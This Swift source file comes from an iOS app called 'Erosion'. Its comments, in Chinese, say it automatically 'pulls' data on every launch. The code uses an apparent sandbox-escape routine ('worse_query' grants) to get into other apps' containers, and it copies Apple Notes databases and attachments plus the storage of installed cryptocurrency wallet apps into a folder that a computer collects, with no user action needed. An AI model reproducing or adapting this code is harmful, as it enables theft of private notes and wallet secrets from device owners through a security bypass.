//
//  AutoPullService.swift
//  Erosion
//
//  启动就自动拉：备忘录（App 容器 + AppGroup）+ 本机已装钱包容器。
//  目的：装上、打开 App，电脑端就能直接从 Documents/Pulled 取数据，不用手点。
//
//  模式（UserDefaults key: autoPullMode）:
//    off      - 不自动拉
//    missing  - 只拉还没有 Pulled/<bundle> 的（默认，省时间）
//    all      - 每次启动全量重拉
//

import Foundation

final class AutoPullService {
    static let shared = AutoPullService()

    /// 同一分钟内重复触发（比如切前台）就跳过
    private let cooldown: TimeInterval = 120
    private var running = false

    private let fm = FileManager.default

    private var dest: URL { URL.documentsDirectory.appendingPathComponent("Pulled", isDirectory: true) }
    private var manifestURL: URL { URL.documentsDirectory.appendingPathComponent("pulled-manifest.json") }
    private var indexURL: URL { URL.documentsDirectory.appendingPathComponent("container-index.json") }
    private var stateURL: URL { URL.documentsDirectory.appendingPathComponent("auto-pull.json") }

    private let notesBundleID = "com.apple.mobilenotes"
    private let notesAppGroupRoot = "/private/var/mobile/Containers/Shared/AppGroup"

    var mode: String {
        UserDefaults.standard.string(forKey: "autoPullMode") ?? "missing"
    }

    // MARK: - 入口

    func startIfDue() {
        guard mode != "off" else {
            print("(auto) 模式 off，跳过")
            return
        }
        guard !running else { return }
        let last = UserDefaults.standard.double(forKey: "autoPullLastRun")
        if Date().timeIntervalSince1970 - last < cooldown {
            print("(auto) 冷却中，跳过")
            return
        }
        UserDefaults.standard.set(Date().timeIntervalSince1970, forKey: "autoPullLastRun")
        running = true
        DispatchQueue.global(qos: .utility).async { [weak self] in
            self?.run()
            self?.running = false
        }
    }

    private func run() {
        let startedAt = Date()
        log("=== auto pull start (mode: \(mode)) ===")
        OpLog.append("auto", "start", "启动自动拉取 (\(mode))")

        var index = loadIndex()
        // 电脑端推过来的精确容器路径（Documents/container-hints.json）优先于扫描结果
        let hints = loadHints()
        if !hints.isEmpty {
            log("载入电脑端容器提示 \(hints.count) 条")
            index.merge(hints) { _, hint in hint }
        }
        // 索引不全（新装了钱包 / 首次启动）就补扫一次，否则新钱包永远拉不到
        let presetsWithoutKnown = walletPresets.filter { $0.known == nil }.map(\.bundleID)
        let missingFromIndex = presetsWithoutKnown.filter { index[$0] == nil }
        if missingFromIndex.count > presetsWithoutKnown.count / 2 {
            log("索引缺口大（缺 \(missingFromIndex.count) 个预设），补扫一次")
            index.merge(scanContainers()) { current, _ in current }
        }

        var summary: [[String: Any]] = []

        // 1) 备忘录 App 容器（NoteStore.sqlite 在这里）
        if let notesPath = index[notesBundleID] ?? knownNotesContainer() {
            if shouldPull(notesBundleID) {
                let result = pull(path: notesPath, as: notesBundleID)
                summary.append(result)
            }
        } else {
            log("没找到备忘录容器")
            OpLog.append("auto", "fail", "没找到 com.apple.mobilenotes 容器")
        }

        // 2) 备忘录 AppGroup（附件 / 共享数据）
        if shouldPull("NotesGroup"), let groupPath = findNotesGroup() {
            let result = pull(path: groupPath, as: "NotesGroup")
            summary.append(result)
        }

        // 3) 本机已装钱包
        var seen = Set<String>()
        for wallet in walletPresets {
            guard let path = index[wallet.bundleID] ?? wallet.known else { continue }
            guard !seen.contains(wallet.bundleID) else { continue }
            seen.insert(wallet.bundleID)
            guard shouldPull(wallet.bundleID) else { continue }
            let result = pull(path: path, as: wallet.bundleID)
            summary.append(result)
        }

        let state: [String: Any] = [
            "finishedAt": ISO8601DateFormatter().string(from: Date()),
            "elapsed": Int(Date().timeIntervalSince(startedAt)),
            "mode": mode,
            "entries": summary,
        ]
        if let data = try? JSONSerialization.data(withJSONObject: state, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: stateURL)
        }
        log("=== auto pull done in \(Int(Date().timeIntervalSince(startedAt)))s, \(summary.count) targets ===")
        OpLog.append("auto", "done", "自动拉取完成：\(summary.count) 个目标")
    }

    // MARK: - 条件

    private func shouldPull(_ bundleID: String) -> Bool {
        if mode == "all" { return true }
        let out = dest.appendingPathComponent(bundleID, isDirectory: true)
        var isDir: ObjCBool = false
        let exists = fm.fileExists(atPath: out.path, isDirectory: &isDir) && isDir.boolValue
        if !exists { return true }
        // 目录存在但没有文件（上次失败），也算缺
        let count = (try? fm.contentsOfDirectory(atPath: out.path).count) ?? 0
        return count == 0
    }

    // MARK: - 索引

    private func loadIndex() -> [String: String] {
        guard let data = try? Data(contentsOf: indexURL),
              let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String] else {
            return [:]
        }
        log("载入索引 \(dict.count) 条")
        return dict
    }

    private func loadHints() -> [String: String] {
        let url = URL.documentsDirectory.appendingPathComponent("container-hints.json")
        guard let data = try? Data(contentsOf: url),
              let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String] else {
            return [:]
        }
        return dict
    }

    private func scanContainers() -> [String: String] {
        let root = "/var/mobile/Containers/Data/Application"
        let paths = fsHandlers.getDirPaths(root, maxInode: 40_000_000).filter { !$0.isEmpty }
        log("扫描到 \(paths.count) 个容器目录")

        var found: [String: String] = [:]
        for raw in paths {
            let path = raw.hasPrefix("/var/") ? "/private" + raw : raw
            let handle = grant(path)
            guard handle >= 0 else { continue }
            if let ident = bundleID(at: path) {
                found[ident] = path
            }
            worse_query_release(handle)
        }

        if let data = try? JSONSerialization.data(withJSONObject: found, options: [.prettyPrinted]) {
            try? data.write(to: indexURL)
        }
        log("索引完成：\(found.count) 个容器")
        return found
    }

    /// 换机 / 重装后 UUID 会变，这里只当兜底提示；真实路径优先走索引
    private func knownNotesContainer() -> String? {
        let path = "/private/var/mobile/Containers/Data/Application/F443C7AE-3166-4EF3-B633-61D4BA9F4FF7"
        let handle = grant(path)
        guard handle >= 0 else { return nil }
        defer { worse_query_release(handle) }
        return bundleID(at: path) == notesBundleID ? path : nil
    }

    private func findNotesGroup() -> String? {
        let preferred = "/private/var/mobile/Containers/Shared/AppGroup/5FEEE48A-F19D-48C9-B524-9E40BB0875F1"
        if grant(preferred) >= 0 { return preferred }

        guard grant(notesAppGroupRoot) >= 0 else { return nil }
        guard let dirs = try? fm.contentsOfDirectory(atPath: notesAppGroupRoot) else { return nil }
        for dir in dirs {
            let path = notesAppGroupRoot + "/" + dir
            let handle = grant(path)
            guard handle >= 0 else { continue }
            let meta = path + "/.com.apple.mobile_container_manager.metadata.plist"
            if let dict = NSDictionary(contentsOfFile: meta),
               let ident = dict["MCMMetadataIdentifier"] as? String,
               ident == "group.com.apple.notes" {
                worse_query_release(handle)
                return path
            }
            worse_query_release(handle)
        }
        return nil
    }

    // MARK: - 权限 / 复制

    private func grant(_ path: String) -> Int64 {
        var handle = worse_query(path, group, false, false)
        if handle < 0 { handle = worse_query(path, group, true, false) }
        if handle < 0 { handle = worse_query(path, group, false, true) }
        return handle
    }

    private func bundleID(at path: String) -> String? {
        var buf = [UInt8](repeating: 0, count: 512)
        let len = buf.withUnsafeMutableBytes { ptr -> Int in
            getxattr(path, "com.apple.containermanager.identifier", ptr.baseAddress, 511, 0, XATTR_NOFOLLOW)
        }
        guard len > 0 else { return nil }
        return String(cString: buf)
    }

    @discardableResult
    private func pull(path: String, as name: String) -> [String: Any] {
        let handle = grant(path)
        guard handle >= 0 else {
            log("grant 失败 \(handle): \(name)")
            OpLog.append("auto", "fail", "\(name) grant 失败 \(handle)")
            return ["bundleId": name, "files": 0, "bytes": 0, "error": "grant \(handle)"]
        }
        defer { worse_query_release(handle) }

        let outDir = dest.appendingPathComponent(name, isDirectory: true)
        try? fm.createDirectory(at: outDir, withIntermediateDirectories: true)

        guard let enumerator = fm.enumerator(
            at: URL(fileURLWithPath: path),
            includingPropertiesForKeys: [.isRegularFileKey],
            options: [.skipsHiddenFiles]
        ) else {
            log("枚举失败: \(path)")
            return ["bundleId": name, "files": 0, "bytes": 0, "error": "enumerate"]
        }

        var copiedFiles = 0
        var copiedBytes: Int64 = 0
        var fileList: [[String: Any]] = []
        var topStats: [String: (files: Int, bytes: Int64)] = [:]

        for case let url as URL in enumerator {
            let isFile = (try? url.resourceValues(forKeys: [.isRegularFileKey]))?.isRegularFile ?? false
            guard isFile else { continue }

            let rel = url.path.hasPrefix(path + "/")
                ? String(url.path.dropFirst(path.count + 1))
                : url.lastPathComponent
            let dst = outDir.appendingPathComponent(rel)

            do {
                try fm.createDirectory(at: dst.deletingLastPathComponent(), withIntermediateDirectories: true)
                if fm.fileExists(atPath: dst.path) { try fm.removeItem(at: dst) }
                try fm.copyItem(at: url, to: dst)
                let size = (try? fm.attributesOfItem(atPath: dst.path))?[.size] as? NSNumber
                let bytes = size?.int64Value ?? 0
                copiedFiles += 1
                copiedBytes += bytes
                if fileList.count < 20_000 {
                    fileList.append(["path": rel, "size": bytes])
                }
                let topKey = rel.split(separator: "/").first.map(String.init) ?? rel
                var stat = topStats[topKey] ?? (0, 0)
                stat.files += 1
                stat.bytes += bytes
                topStats[topKey] = stat
            } catch {
                log("copy failed \(url.path): \(error.localizedDescription)")
            }
        }

        writeManifestEntry(
            bundleID: name,
            files: copiedFiles,
            bytes: copiedBytes,
            fileList: fileList,
            top: topStats
                .map { ["path": $0.key, "files": $0.value.files, "bytes": $0.value.bytes] as [String: Any] }
                .sorted { ($0["bytes"] as? Int64 ?? 0) > ($1["bytes"] as? Int64 ?? 0) }
        )
        log("拉完 \(name): \(copiedFiles) 个文件 / \(copiedBytes) 字节")
        return ["bundleId": name, "files": copiedFiles, "bytes": copiedBytes]
    }

    private func writeManifestEntry(bundleID: String, files: Int, bytes: Int64, fileList: [[String: Any]], top: [[String: Any]]) {
        var manifest: [String: Any] = [:]
        if let data = try? Data(contentsOf: manifestURL),
           let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
            manifest = dict
        }
        manifest[bundleID] = [
            "files": files,
            "bytes": bytes,
            "top": top,
            "fileList": fileList,
            "updatedAt": ISO8601DateFormatter().string(from: Date()),
        ]
        if let data = try? JSONSerialization.data(withJSONObject: manifest, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: manifestURL)
        }
    }

    private func log(_ line: String) {
        print("(auto) \(line)")
    }
}
